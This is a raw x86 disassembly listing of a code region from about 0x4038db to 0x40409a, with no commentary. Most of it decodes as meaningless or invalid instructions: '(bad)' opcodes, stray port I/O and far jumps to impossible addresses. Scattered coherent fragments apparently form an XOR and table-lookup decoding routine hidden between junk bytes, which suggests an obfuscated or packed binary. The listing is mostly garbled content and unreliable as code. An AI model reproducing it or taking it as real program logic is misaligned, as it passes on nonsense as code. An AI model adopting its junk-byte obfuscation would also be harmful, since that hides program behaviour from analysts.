  4038db:	lds    ebp,FWORD PTR [edx+0x2d7670f1]
  4038e1:	sbb    bl,BYTE PTR [edi]
  4038e3:	xor    ebp,DWORD PTR [ecx-0x3b0a6ea7]
  4038e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038ea:	les    ecx,FWORD PTR [ecx]
  4038ec:	adc    eax,0xa4b80f80
  4038f1:	sbb    eax,0x1c
  4038f4:	outs   dx,BYTE PTR ds:[esi]
  4038f5:	nop
  4038f6:	pop    ebp
  4038f7:	jmp    0x403897
  4038f9:	xchg   esp,eax
  4038fa:	add    al,0x3a
  4038fc:	push   ebx
  4038fd:	imul   edx,DWORD PTR [eax+ebp*4],0xffffffdd
  403901:	icebp  
  403902:	dec    esp
  403903:	(bad)
  403906:	mov    ecx,0x7bf558ea
  40390b:	fidiv  DWORD PTR [esi*4-0x30af06be]
  403912:	jae    0x40397e
  403914:	mov    ah,0x2
  403916:	std    
  403917:	mov    dl,0xf0
  403919:	dec    esp
  40391a:	xchg   esi,eax
  40391b:	ja     0x403964
  40391d:	(bad)  
  40391e:	fcomp  st(5)
  403920:	mov    dl,0x99
  403922:	icebp  
  403923:	rcr    al,0x79
  403926:	not    ebp
  403928:	mov    DWORD PTR [edx-0x774ab8d0],edx
  40392e:	and    esp,DWORD PTR [edx]
  403930:	icebp  
  403931:	xchg   edi,eax
  403932:	dec    esp
  403933:	xor    eax,0xb866501f
  403938:	imul   edi,esp,0x76
  40393b:	scas   eax,DWORD PTR es:[edi]
  40393c:	mov    ecx,DWORD PTR [eax-0x62]
  40393f:	xchg   ebx,eax
  403940:	mov    eax,0x8b165b5f
  403945:	jae    0x403939
  403947:	mov    bh,0x46
  403949:	xchg   ecx,eax
  40394a:	mov    ds:0x8d6e0c68,al
  40394f:	mov    cl,0x3e
  403951:	cdq    
  403952:	(bad)  
  403954:	jmp    0x4c6ce5ac
  403959:	lea    ecx,[eax+ecx*4]
  40395c:	jge    0x403963
  40395e:	cwde   
  40395f:	mov    al,ds:0xc7f452bb
  403964:	gs mov ecx,0x4c4363c0
  40396a:	out    dx,eax
  40396b:	jo     0x4039df
  40396d:	js     0x403910
  40396f:	add    ah,BYTE PTR [ebp+0x384e680f]
  403975:	cmp    al,0x5a
  403977:	bound  esi,QWORD PTR [esp+edx*1]
  40397a:	sub    DWORD PTR [edx+0x2b],esp
  40397d:	mov    edi,0x8397a5c8
  403982:	cmc    
  403983:	sub    ch,cl
  403985:	cmp    ebx,ecx
  403987:	scas   al,BYTE PTR es:[edi]
  403988:	aas    
  403989:	mov    eax,DWORD PTR [eax-0x3b]
  40398c:	pop    ecx
  40398d:	retw   
  40398f:	stos   DWORD PTR es:[edi],eax
  403990:	fild   WORD PTR [ecx+ebp*4-0xb]
  403994:	pop    es
  403995:	adc    eax,0xccfe9091
  40399a:	xor    DWORD PTR [ebx-0x5fd2ecd],esi
  4039a0:	mov    ah,0x38
  4039a2:	jge    0x403a23
  4039a4:	mov    al,ds:0xbcc1c0a3
  4039a9:	xchg   edi,eax
  4039aa:	sub    ecx,DWORD PTR [esi]
  4039ac:	dec    DWORD PTR [esi]
  4039ae:	inc    ebx
  4039af:	jno    0x403a18
  4039b1:	imul   esi,ecx,0xf3b28dac
  4039b7:	cmp    BYTE PTR [esi-0x6f64313f],dl
  4039bd:	(bad)  
  4039be:	aam    0x8
  4039c0:	repz cmovno edx,DWORD PTR [edi+0x27]
  4039c5:	mov    ebp,0xe3874427
  4039ca:	leave  
  4039cb:	and    eax,0xb209e57f
  4039d0:	or     esp,0xf
  4039d3:	sbb    eax,0x53d1057e
  4039d8:	fdiv   QWORD PTR [edi]
  4039da:	inc    edi
  4039db:	retf   
  4039dc:	outs   dx,DWORD PTR ds:[esi]
  4039dd:	out    0xc9,eax
  4039df:	sub    al,0xb2
  4039e1:	mov    ch,0x8f
  4039e3:	pop    edx
  4039e4:	mov    eax,ds:0x7fbe9d9d
  4039e9:	mov    edx,0xd7c605
  4039ee:	or     eax,0x310a92dd
  4039f3:	push   ecx
  4039f4:	or     edi,ebp
  4039f6:	pusha  
  4039f7:	and    bh,BYTE PTR [ebx-0x27]
  4039fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039fb:	jecxz  0x4039c0
  4039fd:	cld    
  4039fe:	dec    esp
  4039ff:	xor    ebp,edi
  403a01:	clc    
  403a02:	ins    DWORD PTR es:[edi],dx
  403a03:	mov    esi,DWORD PTR [esi+0xc]
  403a06:	cmp    ah,ah
  403a08:	es push 0x1c2fc5d
  403a0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a0f:	in     al,0xfd
  403a11:	jb     0x4039f1
  403a13:	jmp    0x403a62
  403a15:	or     al,bl
  403a17:	leave  
  403a18:	xor    eax,0x7dd62171
  403a1d:	mov    bl,0xc
  403a1f:	shl    BYTE PTR [edx+0x4bb49d2b],cl
  403a25:	inc    esi
  403a26:	push   es
  403a27:	ret    0xe43c
  403a2a:	loop   0x4039d2
  403a2c:	les    ecx,FWORD PTR es:[esi]
  403a2f:	div    BYTE PTR [edx+ecx*4]
  403a32:	data16 fst DWORD PTR gs:[ebx-0x5f29a685]
  403a3a:	iret   
  403a3b:	call   0xca0dacd5
  403a40:	jl     0x403a97
  403a42:	sub    esi,DWORD PTR [edi]
  403a44:	push   edi
  403a45:	sub    DWORD PTR [ecx+0x15],eax
  403a48:	lods   al,BYTE PTR ds:[esi]
  403a49:	xor    eax,0x202d9f0c
  403a4e:	test   BYTE PTR [esi],cl
  403a50:	mov    edi,DWORD PTR [ebp-0x4]
  403a53:	jmp    0x403c5f
  403a58:	addr16 jo 0x403aaa
  403a5b:	or     BYTE PTR [ebx+0x33],cl
  403a5e:	arpl   WORD PTR [ebx+0x3c],si
  403a61:	aas    
  403a62:	cwde   
  403a63:	pop    ss
  403a64:	shr    BYTE PTR [ecx],0x8a
  403a67:	gs gs push ds
  403a6a:	jl     0x403ae8
  403a6c:	ins    DWORD PTR es:[edi],dx
  403a6d:	jg     0x403aeb
  403a6f:	jl     0x403ab1
  403a71:	sar    BYTE PTR [edi-0x5db40d69],1
  403a77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a78:	out    dx,al
  403a79:	xor    DWORD PTR [ecx+0x25],eax
  403a7c:	outs   dx,DWORD PTR ds:[esi]
  403a7d:	(bad)  
  403a7e:	and    eax,0x677486be
  403a83:	pushf  
  403a84:	pop    esi
  403a85:	sub    ecx,esp
  403a87:	fnsave [ebp-0x69]
  403a8a:	and    eax,0x9568383a
  403a8f:	inc    eax
  403a90:	mov    esi,edx
  403a92:	add    edi,DWORD PTR [ebp+0x37cb51c3]
  403a98:	or     DWORD PTR [edi+ebp*1],0xffffffa5
  403a9c:	push   esp
  403a9d:	ret    0xe721
  403aa0:	pop    esi
  403aa1:	arpl   WORD PTR [edx],bx
  403aa3:	dec    ecx
  403aa4:	mov    ds,WORD PTR [edx+edi*1-0xcb884bc]
  403aab:	cdq    
  403aac:	pop    edx
  403aad:	or     esp,DWORD PTR [eax]
  403aaf:	clc    
  403ab0:	adc    DWORD PTR [ebx-0x3c1417f],esp
  403ab6:	inc    esi
  403ab7:	and    ch,al
  403ab9:	ret    
  403aba:	ja     0x403a70
  403abc:	arpl   si,si
  403abe:	mov    ecx,ss
  403ac0:	scas   al,BYTE PTR es:[edi]
  403ac1:	mov    ds:0xfb9ed3dd,eax
  403ac6:	ss cwde 
  403ac8:	sbb    al,0x3c
  403aca:	adc    al,0x36
  403acc:	inc    ebx
  403acd:	gs das 
  403acf:	add    al,0x6c
  403ad1:	fild   DWORD PTR [ecx+0x52]
  403ad4:	cmp    eax,0x6fa11b0b
  403ad9:	mov    ch,dl
  403adb:	mov    bp,0xfe1a
  403adf:	xchg   DWORD PTR [edi+0x21a387fa],ebp
  403ae5:	and    DWORD PTR [ecx-0x12],ebx
  403ae8:	add    ah,bl
  403aea:	push   ds
  403aeb:	bound  ecx,QWORD PTR [ecx+0x6437d99f]
  403af1:	dec    ecx
  403af2:	pop    edx
  403af3:	jnp    0x403adf
  403af5:	xchg   ebp,eax
  403af6:	lahf   
  403af7:	mov    ds:0xf6b2988a,al
  403afc:	pop    ecx
  403afd:	dec    edi
  403afe:	adc    ch,BYTE PTR [eax-0x40]
  403b01:	jo     0x403b25
  403b03:	add    ebx,DWORD PTR [eax+0x68b3416a]
  403b09:	mov    ch,0x6a
  403b0b:	fbstp  TBYTE PTR [ebx+edx*2-0x35c1b39f]
  403b12:	jnp    0x403b62
  403b14:	xchg   edx,eax
  403b15:	enter  0xb539,0xe2
  403b19:	neg    cl
  403b1b:	imul   eax,DWORD PTR [esi+0xd],0xe8c8122e
  403b22:	mov    al,0x67
  403b24:	mov    dh,0xa6
  403b26:	stc    
  403b27:	into   
  403b28:	mov    esp,0xa936f709
  403b2d:	mov    ecx,0x6adbc088
  403b32:	jbe    0x403b0c
  403b34:	sahf   
  403b35:	xor    al,0x88
  403b37:	pop    esi
  403b38:	stos   BYTE PTR es:[edi],al
  403b39:	mov    ebp,esp
  403b3b:	test   ebx,edi
  403b3d:	fs push ds
  403b3f:	and    ah,dl
  403b41:	inc    esp
  403b42:	ror    DWORD PTR [edi],cl
  403b44:	ret    
  403b45:	out    dx,al
  403b46:	xchg   bl,dl
  403b48:	ja     0x403b13
  403b4a:	and    al,0x6e
  403b4c:	jbe    0x403bad
  403b4e:	int    0xdc
  403b50:	xchg   edi,eax
  403b51:	int    0x98
  403b53:	mov    cs,esi
  403b55:	mov    dl,0xd4
  403b57:	or     eax,0xb072b495
  403b5c:	pop    ebp
  403b5d:	in     eax,0xa8
  403b5f:	jo     0x403b9e
  403b61:	sahf   
  403b62:	xchg   ecx,esp
  403b64:	rcl    edi,cl
  403b66:	and    eax,0xf7dfe32a
  403b6b:	ficom  WORD PTR [ebp-0x7b57f2b4]
  403b71:	mov    WORD PTR [esi],cs
  403b73:	adc    ebx,ebp
  403b75:	sbb    bh,bl
  403b77:	icebp  
  403b78:	adc    ecx,DWORD PTR [edi+ebx*1-0x25]
  403b7c:	or     al,0x7
  403b7e:	xor    DWORD PTR [ebx],ebx
  403b80:	and    eax,0x582bb587
  403b85:	repz (bad) 
  403b87:	sub    al,BYTE PTR [edx]
  403b89:	sub    DWORD PTR [ebp+ebx*4+0x7e],esi
  403b8d:	jns    0x403bbb
  403b8f:	mov    ah,0xb3
  403b91:	je     0x403c0f
  403b93:	mov    eax,0x388f3223
  403b98:	xchg   edx,eax
  403b99:	sub    ch,BYTE PTR [ecx+ecx*1+0x72e2e204]
  403ba0:	mov    bh,0x97
  403ba2:	xor    BYTE PTR [ebx],cl
  403ba4:	bound  edx,QWORD PTR [ebx]
  403ba6:	push   ebp
  403ba7:	stos   DWORD PTR es:[edi],eax
  403ba8:	or     eax,0x946e9539
  403bad:	lods   eax,DWORD PTR ds:[esi]
  403bae:	or     DWORD PTR [edx-0x3a],edx
  403bb1:	pop    esi
  403bb2:	(bad)  
  403bb3:	pop    ebp
  403bb4:	mov    ch,0x20
  403bb6:	lods   al,BYTE PTR ds:[esi]
  403bb7:	test   bh,cl
  403bb9:	jg     0x403b98
  403bbb:	inc    esi
  403bbc:	sbb    al,0xa6
  403bbe:	rcr    DWORD PTR [esi-0x462af91b],0x93
  403bc5:	or     ecx,edi
  403bc7:	push   edx
  403bc8:	sbb    DWORD PTR [edi],ecx
  403bca:	xor    ch,bl
  403bcc:	cwde   
  403bcd:	push   esi
  403bce:	addr16 inc ebx
  403bd0:	add    DWORD PTR [ecx+ebx*8-0x5e4103dc],edx
  403bd7:	pop    edi
  403bd8:	shl    BYTE PTR [esi],1
  403bda:	test   DWORD PTR [ebx+0x34ad34d7],0xfbb84d71
  403be4:	shl    BYTE PTR [ecx-0x2e6db349],cl
  403bea:	in     eax,dx
  403beb:	icebp  
  403bec:	inc    ecx
  403bed:	sti    
  403bee:	dec    ecx
  403bef:	pop    eax
  403bf0:	mov    dl,BYTE PTR [edx]
  403bf2:	mov    BYTE PTR [esi],ah
  403bf4:	sub    DWORD PTR [ecx+0x75],ebp
  403bf7:	adc    dl,BYTE PTR [edx+0xcb974cf]
  403bfd:	ins    BYTE PTR es:[edi],dx
  403bfe:	cmc    
  403bff:	stc    
  403c00:	fstp   TBYTE PTR [edx-0x2e]
  403c03:	mov    edx,0xbdcfe53c
  403c08:	call   0x6bcc8a0d
  403c0d:	cmp    eax,eax
  403c0f:	outs   dx,BYTE PTR ds:[esi]
  403c10:	mov    ecx,0xad31746
  403c15:	mov    ecx,0xf24d0905
  403c1a:	mov    al,ds:0x24074d3c
  403c1f:	add    ebx,DWORD PTR [eax-0x39]
  403c22:	lods   eax,DWORD PTR ds:[esi]
  403c23:	mov    ebp,0x4feea819
  403c28:	les    ebp,FWORD PTR [edi+eiz*4]
  403c2b:	xchg   ebp,eax
  403c2c:	jle    0x403c89
  403c2e:	bound  eax,QWORD PTR [ebx+0x3ffda34a]
  403c34:	xor    ch,BYTE PTR [ecx-0x679e74fa]
  403c3a:	add    ebp,esi
  403c3c:	jl     0x403bdb
  403c3e:	into   
  403c3f:	data16 ja 0x403c01
  403c42:	mov    ebp,0x6d8f72e5
  403c47:	inc    edi
  403c48:	aaa    
  403c49:	out    0x54,al
  403c4b:	scas   al,BYTE PTR es:[edi]
  403c4c:	push   edi
  403c4d:	pop    ss
  403c4e:	jno    0x403c33
  403c50:	ret    0xbcd2
  403c53:	dec    esp
  403c54:	push   ebx
  403c55:	adc    eax,0x21edbed1
  403c5a:	js     0x403cc9
  403c5c:	jmp    0x403c07
  403c5e:	pop    esp
  403c5f:	xor    edi,ecx
  403c61:	add    edi,esi
  403c63:	mov    esi,DWORD PTR [ebp+0x8]
  403c66:	imul   edi,edx
  403c69:	mov    ebx,DWORD PTR [ebp+0xc]
  403c6c:	xor    eax,ecx
  403c6e:	add    eax,edx
  403c70:	mov    al,BYTE PTR [ebx+eax*1+0x32729a]
  403c77:	mov    BYTE PTR [edi+esi*1],al
  403c7a:	mov    eax,DWORD PTR [ebp-0x4]
  403c7d:	xor    eax,ecx
  403c7f:	lea    edx,[edx+eax*1+0x32729a]
  403c86:	mov    eax,DWORD PTR [ebp-0x4]
  403c89:	xor    eax,ecx
  403c8b:	mov    esi,0xffcd8d66
  403c90:	jmp    0x403e9c
  403c95:	dec    edi
  403c96:	push   ss
  403c97:	sbb    eax,DWORD PTR [ebp+ebp*2+0x7d]
  403c9b:	jae    0x403cae
  403c9d:	sti    
  403c9e:	adc    ebp,DWORD PTR ds:0x2a6abb97
  403ca4:	sti    
  403ca5:	dec    edx
  403ca6:	sbb    BYTE PTR [esp+edi*2+0x6d],bh
  403caa:	jg     0x403d28
  403cac:	jl     0x403ccb
  403cae:	push   ebx
  403caf:	mul    DWORD PTR [ecx]
  403cb1:	les    esi,FWORD PTR [edi+0x530eeaea]
  403cb7:	stos   DWORD PTR es:[edi],eax
  403cb8:	cmp    ecx,DWORD PTR [ebx-0x24]
  403cbb:	adc    cl,BYTE PTR [edi]
  403cbd:	iret   
  403cbe:	dec    esi
  403cbf:	mov    BYTE PTR [ebp-0x59],al
  403cc2:	adc    esp,edi
  403cc4:	push   0x5e
  403cc6:	xlat   BYTE PTR ds:[ebx]
  403cc7:	dec    ebp
  403cc8:	mov    bh,BYTE PTR [edx]
  403cca:	xor    ah,al
  403ccc:	mov    eax,ds:0x3271a94c
  403cd1:	jnp    0x403ce2
  403cd3:	push   esi
  403cd4:	fnsave [edx-0x8]
  403cd7:	and    al,0x6d
  403cd9:	enter  0x6a38,0xfe
  403cdd:	inc    esp
  403cde:	stos   DWORD PTR es:[edi],eax
  403cdf:	shl    esi,0x52
  403ce2:	mov    ch,0x15
  403ce4:	addr16 retf 0xf12c
  403ce8:	push   ebx
  403ce9:	popf   
  403cea:	stos   DWORD PTR es:[edi],eax
  403ceb:	mov    ds:0x1eb3a5bb,eax
  403cf0:	mov    ebp,0x3f8e328e
  403cf5:	fild   QWORD PTR [edx-0x33435e3f]
  403cfb:	or     eax,0x499c1153
  403d00:	push   esp
  403d01:	nop
  403d02:	pop    ss
  403d03:	and    al,0xce
  403d05:	cmp    ebx,DWORD PTR [edi+0x62f8b4bf]
  403d0b:	fistp  DWORD PTR [ebp+0x16562b79]
  403d11:	sbb    eax,0x6d343ee5
  403d16:	xchg   ebp,eax
  403d17:	sbb    al,0x12
  403d19:	sbb    ax,dx
  403d1c:	test   BYTE PTR [edx+esi*8-0x2a],dh
  403d20:	pusha  
  403d21:	leave  
  403d22:	cwd    
  403d24:	(bad)  
  403d25:	adc    ah,ah
  403d27:	call   0xe477:0x12b7593c
  403d2e:	xchg   ecx,eax
  403d2f:	xor    al,0xba
  403d31:	out    0x55,al
  403d33:	cmp    BYTE PTR [eax+0x40],al
  403d36:	outs   dx,BYTE PTR ds:[esi]
  403d37:	in     eax,0x34
  403d39:	jbe    0x403cbb
  403d3b:	ret    0xf691
  403d3e:	repz xchg edx,eax
  403d40:	xor    DWORD PTR [ecx-0x62],ecx
  403d43:	enter  0xed01,0xe7
  403d47:	loopne 0x403d78
  403d49:	inc    ebp
  403d4a:	and    esi,DWORD PTR [ebx]
  403d4c:	push   ds
  403d4d:	loopne 0x403d55
  403d4f:	clc    
  403d50:	outs   dx,BYTE PTR ds:[esi]
  403d51:	mov    esi,0x1dc38ad3
  403d56:	add    BYTE PTR [ecx-0x48],dl
  403d59:	dec    esi
  403d5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d5b:	push   esp
  403d5c:	retf   
  403d5d:	stos   DWORD PTR es:[edi],eax
  403d5e:	mov    ebp,DWORD PTR [edi-0x35]
  403d61:	adc    dl,cl
  403d63:	scas   eax,DWORD PTR es:[edi]
  403d64:	jnp    0x403d7a
  403d66:	leave  
  403d67:	lock pop edx
  403d69:	mov    eax,0x26eb79ff
  403d6e:	dec    ebx
  403d6f:	xor    esi,DWORD PTR [edx]
  403d71:	add    BYTE PTR [edx-0x4304f831],dh
  403d77:	lock in eax,0x23
  403d7a:	or     eax,0xad993130
  403d7f:	popf   
  403d80:	xchg   esp,eax
  403d81:	dec    esi
  403d82:	dec    ebx
  403d83:	sbb    dl,BYTE PTR [ecx+0xbf7928f]
  403d89:	cmp    ebx,DWORD PTR [esi+0xcc63f2c]
  403d8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d90:	fwait
  403d91:	jbe    0x403dbb
  403d93:	push   edx
  403d94:	stc    
  403d95:	daa    
  403d96:	pop    esp
  403d97:	add    esp,DWORD PTR [edx+0x592963bd]
  403d9d:	pop    edi
  403d9e:	cmp    edi,DWORD PTR [esi]
  403da0:	frstor [ecx]
  403da2:	and    al,0xea
  403da4:	repz mov cl,0xfe
  403da7:	mov    dl,BYTE PTR [ebp+0x57]
  403daa:	in     eax,dx
  403dab:	xlat   BYTE PTR ds:[ebx]
  403dac:	pop    edi
  403dad:	je     0x403d8a
  403daf:	mov    bh,0x9f
  403db1:	cwde   
  403db2:	xor    al,0x65
  403db4:	mov    edx,0x10e3ebd0
  403db9:	or     eax,0x1ad2f2fe
  403dbe:	test   BYTE PTR [edi-0x47],ah
  403dc1:	jg     0x403d65
  403dc3:	adc    eax,0xa47bbdfb
  403dc8:	jne    0x403e3b
  403dca:	call   0xef34f059
  403dcf:	mov    al,0xe7
  403dd1:	lods   eax,DWORD PTR ds:[esi]
  403dd2:	retf   0xb5aa
  403dd5:	dec    edx
  403dd6:	adc    edi,DWORD PTR [eax]
  403dd8:	adc    DWORD PTR [ebx+eiz*1+0x6],edx
  403ddc:	popa   
  403ddd:	jmp    0x4c82:0x557e4d5c
  403de4:	mov    ebx,0x5be3bb9a
  403de9:	and    DWORD PTR [ecx-0x67],edx
  403dec:	(bad)  
  403ded:	std    
  403dee:	pop    edi
  403def:	add    eax,0x5f85c521
  403df4:	(bad)  
  403df5:	fld    TBYTE PTR [edi+0x7d767a8b]
  403dfb:	and    BYTE PTR [eax],0xd0
  403dfe:	retf   
  403dff:	add    ebx,ebx
  403e01:	pop    ds
  403e02:	ds sub dl,0x3e
  403e06:	fidivr WORD PTR [eax]
  403e08:	jmp    0xa876:0x6822292e
  403e0f:	xchg   ebp,eax
  403e10:	jo     0x403dbf
  403e12:	std    
  403e13:	jl     0x403e1b
  403e15:	jmp    0xf4892f6
  403e1a:	out    0xc,al
  403e1c:	xchg   ebx,eax
  403e1d:	pop    eax
  403e1e:	not    BYTE PTR ds:0x232c2d1f
  403e24:	fisttp WORD PTR [ecx]
  403e26:	push   es
  403e27:	bound  esi,QWORD PTR [edi+0x2b86d110]
  403e2d:	fcomp  DWORD PTR [edx]
  403e2f:	das    
  403e30:	aam    0x56
  403e32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e33:	add    al,0x98
  403e35:	or     ah,BYTE PTR [eax+0x2d081983]
  403e3b:	dec    edx
  403e3c:	fsubr  DWORD PTR [edi]
  403e3e:	push   ebp
  403e3f:	fsub   DWORD PTR ds:0xd36b3cf0
  403e45:	fwait
  403e46:	inc    ebx
  403e47:	sti    
  403e48:	loope  0x403dfd
  403e4a:	ret    0x66df
  403e4d:	outs   dx,BYTE PTR ds:[esi]
  403e4e:	bound  esi,QWORD PTR [eax+esi*8+0x49]
  403e52:	mov    bl,0xda
  403e54:	shl    BYTE PTR [ecx+0x590382c],1
  403e5a:	test   DWORD PTR [ecx],eax
  403e5c:	rcr    BYTE PTR [ebp+0x17],1
  403e5f:	cmp    DWORD PTR [edx+0x2a],eax
  403e62:	dec    ebx
  403e63:	ins    BYTE PTR es:[edi],dx
  403e64:	and    bh,BYTE PTR [esi]
  403e66:	and    al,0x94
  403e68:	jb     0x403e8d
  403e6a:	push   es
  403e6b:	inc    edx
  403e6c:	xchg   al,dl
  403e6e:	cwde   
  403e6f:	and    bh,BYTE PTR [esi+0xf1d0b58]
  403e75:	mov    esp,0x40d9574b
  403e7a:	retf   
  403e7b:	sahf   
  403e7c:	mov    cl,0xc0
  403e7e:	psubb  mm0,QWORD PTR [esi+0x53770a7b]
  403e85:	mov    ecx,0x2d5cd288
  403e8a:	mov    al,ds:0xb8b524ac
  403e8f:	fwait
  403e90:	xchg   edx,eax
  403e91:	pop    ebp
  403e92:	inc    edx
  403e93:	sub    DWORD PTR [eax-0x1f00ef2],esp
  403e99:	push   esi
  403e9a:	mov    ?,ebx
  403e9c:	sub    esi,eax
  403e9e:	add    esi,DWORD PTR [ebp+0x10]
  403ea1:	cmp    edx,esi
  403ea3:	jbe    0x403630
  403ea9:	pop    ebx
  403eaa:	mov    eax,0xf89c8534
  403eaf:	pop    edi
  403eb0:	pop    esi
  403eb1:	leave  
  403eb2:	ret    0xc
  403eb5:	push   ebp
  403eb6:	mov    ebp,esp
  403eb8:	mov    eax,DWORD PTR [ebp+0xc]
  403ebb:	xor    edx,edx
  403ebd:	mov    ecx,0x7264fcad
  403ec2:	div    ecx
  403ec4:	mov    ecx,DWORD PTR [ebp+0x10]
  403ec7:	and    ecx,eax
  403ec9:	jmp    0x4040d5
  403ece:	(bad)  
  403ecf:	addr16 jns 0x403f24
  403ed2:	icebp  
  403ed3:	jb     0x403f28
  403ed5:	ins    DWORD PTR es:[edi],dx
  403ed6:	add    al,0x2a
  403ed8:	pop    esi
  403ed9:	push   0x53fb7532
  403ede:	mov    ebx,0x6d7c7c1a
  403ee3:	jg     0x403f61
  403ee5:	jl     0x403f62
  403ee7:	jp     0x403ed6
  403ee9:	cs (bad) 
  403eec:	call   0xea6f443b
  403ef1:	mov    WORD PTR [ebx-0x29],ds
  403ef4:	ins    BYTE PTR es:[edi],dx
  403ef5:	mov    esi,0x7136a7fb
  403efa:	jb     0x403ebc
  403efc:	(bad)  
  403efd:	jmp    0x8bba:0xbd4b2e5
  403f04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f05:	mov    bh,0xe4
  403f07:	in     al,0x85
  403f09:	daa    
  403f0a:	or     edi,DWORD PTR [ebx+0x3d]
  403f0d:	mov    ebp,0xefc822f9
  403f12:	adc    DWORD PTR [ebp+esi*1+0x59883ff1],0x8241d212
  403f1d:	out    0x89,eax
  403f1f:	mov    ecx,0xf4669e2d
  403f24:	mov    ch,0x96
  403f26:	in     eax,0xb2
  403f28:	pop    DWORD PTR [eax-0x27]
  403f2b:	outs   dx,DWORD PTR ds:[esi]
  403f2c:	cmp    DWORD PTR [edx-0x22fe3bc0],edx
  403f32:	and    DWORD PTR [eax-0x73],ecx
  403f35:	lahf   
  403f36:	and    bh,BYTE PTR [eax]
  403f38:	push   edx
  403f39:	fs dec eax
  403f3b:	dec    edi
  403f3c:	adc    DWORD PTR [eax+0x4000d54b],edi
  403f42:	mov    edi,0x2df6f282
  403f47:	sub    ecx,ebp
  403f49:	adc    esp,DWORD PTR [edi]
  403f4b:	test   al,0xe9
  403f4d:	cmp    eax,0x79f9743c
  403f52:	ret    
  403f53:	or     esi,DWORD PTR [ebx-0x70]
  403f56:	pop    esp
  403f57:	mov    es,WORD PTR [ebp-0x21b03701]
  403f5d:	pop    edx
  403f5e:	push   ds
  403f5f:	dec    ebx
  403f60:	adc    al,BYTE PTR ss:[edx+0x7d3ce90a]
  403f67:	jb     0x403fb0
  403f69:	jnp    0x403f4e
  403f6b:	mov    cl,0xc6
  403f6d:	mov    ch,0xa0
  403f6f:	adc    esp,esi
  403f71:	mov    bh,0xbc
  403f73:	gs push ebp
  403f75:	and    al,0x8d
  403f77:	ins    DWORD PTR es:[edi],dx
  403f78:	push   cs
  403f79:	in     eax,0x58
  403f7b:	xor    al,0x13
  403f7d:	call   0xc8b4:0x2cbab893
  403f84:	ss inc esp
  403f86:	sbb    DWORD PTR [ebx-0xf],ebp
  403f89:	aam    0x8c
  403f8b:	jp     0x403f35
  403f8d:	sub    ch,ah
  403f8f:	xor    BYTE PTR [edi+0xa],ch
  403f92:	(bad)  
  403f93:	loope  0x403f7f
  403f95:	rcr    dh,cl
  403f97:	xor    ecx,ecx
  403f99:	cmp    bl,BYTE PTR [ebp-0x642eace7]
  403f9f:	add    al,0xd6
  403fa1:	imul   edx,DWORD PTR [esi+0x30],0xffffff85
  403fa5:	ret    0x20ef
  403fa8:	jge    0x403f8c
  403faa:	fidiv  DWORD PTR [esi-0x49d1320a]
  403fb0:	sub    DWORD PTR [ebx],esp
  403fb2:	inc    edi
  403fb3:	data16 hlt 
  403fb5:	mov    eax,0xee4a9819
  403fba:	aad    0x11
  403fbc:	xchg   esi,eax
  403fbd:	pop    DWORD PTR [edx+0x6d]
  403fc0:	mov    WORD PTR [ebp-0x59],?
  403fc3:	fs in  eax,0x34
  403fc6:	ds sub eax,0x31aea09d
  403fcc:	adc    dl,BYTE PTR [edi+ecx*1+0x2451561e]
  403fd3:	out    dx,eax
  403fd4:	mov    ebx,0x82cb9df2
  403fd9:	das    
  403fda:	rcr    BYTE PTR [ecx-0x182ce907],1
  403fe0:	pop    ds
  403fe1:	in     al,dx
  403fe2:	jp     0x403ff5
  403fe4:	in     al,0xf2
  403fe6:	add    BYTE PTR [ebp+0x3c16669a],ah
  403fec:	dec    ebx
  403fed:	and    ch,BYTE PTR [ebp+0x6216ce35]
  403ff3:	mov    ch,0x69
  403ff5:	rcl    DWORD PTR [esi+ecx*2],cl
  403ff8:	mov    bh,0x65
  403ffa:	ret    
  403ffb:	leave  
  403ffc:	mov    dh,0xb5
  403ffe:	out    0xad,eax
  404000:	cmc    
  404001:	push   edx
  404002:	and    dh,BYTE PTR ds:0xcfa03c06
  404008:	pop    ecx
  404009:	push   es
  40400a:	dec    ecx
  40400b:	loopne 0x404052
  40400d:	xor    eax,0xacb10c24
  404012:	jnp    0x40403a
  404014:	xor    ch,dh
  404016:	mov    esi,0x23aff551
  40401b:	ss jecxz 0x40404a
  40401e:	bound  ebp,QWORD PTR [ebp+0x65]
  404021:	push   ebp
  404022:	and    BYTE PTR [edi+0x5a],0xf7
  404026:	add    eax,0xd0fd267f
  40402b:	fisub  WORD PTR [eax+0x6e]
  40402e:	fnstcw WORD PTR [ebx]
  404030:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404031:	push   edx
  404032:	mov    ch,0xc0
  404034:	inc    ecx
  404035:	pop    esp
  404036:	aam    0xac
  404038:	push   ds
  404039:	mov    BYTE PTR [esi],ch
  40403b:	sbb    BYTE PTR [eax],0x32
  40403e:	dec    edi
  40403f:	push   DWORD PTR [ebp+0xc8632d9]
  404045:	push   esp
  404046:	adc    eax,0xac59bb95
  40404b:	or     ah,dh
  40404d:	jge    0x40406e
  40404f:	sti    
  404050:	push   edi
  404051:	into   
  404052:	call   0x104c:0x9c068c44
  404059:	pop    ebp
  40405a:	ror    DWORD PTR [eax+esi*1-0x57eddfb4],cl
  404061:	and    eax,0xf1ec3c1b
  404066:	mov    al,ds:0xe2950f25
  40406b:	sub    al,0x8a
  40406d:	cmp    dh,BYTE PTR [ebp-0x49a07679]
  404073:	les    ebp,FWORD PTR [eax-0x73]
  404076:	outs   dx,DWORD PTR ds:[esi]
  404077:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404078:	outs   dx,BYTE PTR ds:[esi]
  404079:	or     DWORD PTR [ebx],0xc74eda4a
  40407f:	es icebp 
  404081:	stos   DWORD PTR es:[edi],eax
  404082:	repnz push ds
  404084:	lods   al,BYTE PTR ds:[esi]
  404085:	push   edi
  404086:	inc    edi
  404087:	leave  
  404088:	lea    edx,[ecx-0x39ae51dd]
  40408e:	(bad)  
  40408f:	mov    ds:0xabdb733,al
  404094:	scas   al,BYTE PTR es:[edi]
  404095:	pop    ebx
  404096:	sbb    al,BYTE PTR [ebp+0x7b]
  404099:	xchg   esp,eax
  40409a:	push   0xffffff9e
